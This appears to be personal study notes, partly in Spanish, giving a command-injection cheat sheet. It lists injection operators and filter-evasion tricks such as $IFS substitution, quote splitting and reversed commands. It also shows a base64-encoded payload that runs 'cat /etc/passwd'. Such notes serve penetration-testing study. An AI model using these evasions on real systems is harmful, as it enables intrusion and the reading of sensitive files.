# Command Injection

## Operators
- AND: `&&`
- OR: `||`
- newline: `;` or `\n`

## Injections

| Tipo de Inyección                       | Operadores                         |
|-----------------------------------------|------------------------------------|
| SQL Injection                           | ' , ; -- /* */                     |
| Command Injection                       | ; &&                               |
| LDAP Injection                          | * ( ) & |                          |
| XPath Injection                         | ' or and not substring concat count|
| OS Command Injection                    | ; & |                              |
| Code Injection                          | ' ; -- /* */ $() ${} #{} %{} ^     |
| Directory Traversal/File Path Traversal | ../ ..\\ %00                       |
| Object Injection                        | ; & |                              |
| XQuery Injection                        | ' ; -- /* */                       |
| Shellcode Injection                     | \x \u %u %n                       |
| Header Injection                        | \n \r\n \t %0d %0a %09             |


## Filter evasions for command injection
- Bypass blacklisted operators: encodealo con URL encoding `%0a`
    - Usar tabs: `%09`
    - Usar espacios: `%20`
    - Usar $IFS: estos son los Internal Field Separators de bash, por defecto son espacios, tabs y newlines. Se pueden cambiar con `IFS=` y luego se puede usar `$IFS` para separar comandos.
    - Usar llaves `{}`: `{command}`
      - Podemos reemplazar los espacios con `${IFS}` y las barras `/` con `${PATH:0:1}` y el punto y coma con `${LS_COLORS:10:1}`
- Correr caracteres a la derecha: `echo $(tr '!-}' '"-~'<<<[)` esto nos da los caracteres ASCII que podemos usar.
- Poner comillas al comando: `w'h'o'am'i`
- Comando reverseado:
    - `echo 'whoami' | rev`
    - $(rev<<<'imaohw')

### Base64 encoding command injection
- `echo -n 'cat /etc/passwd | grep 33' | base64`
- `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`

#### Tools
- [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
- [DOSfuscator](https://github.com/danielbohannon/Invoke-DOSfuscation)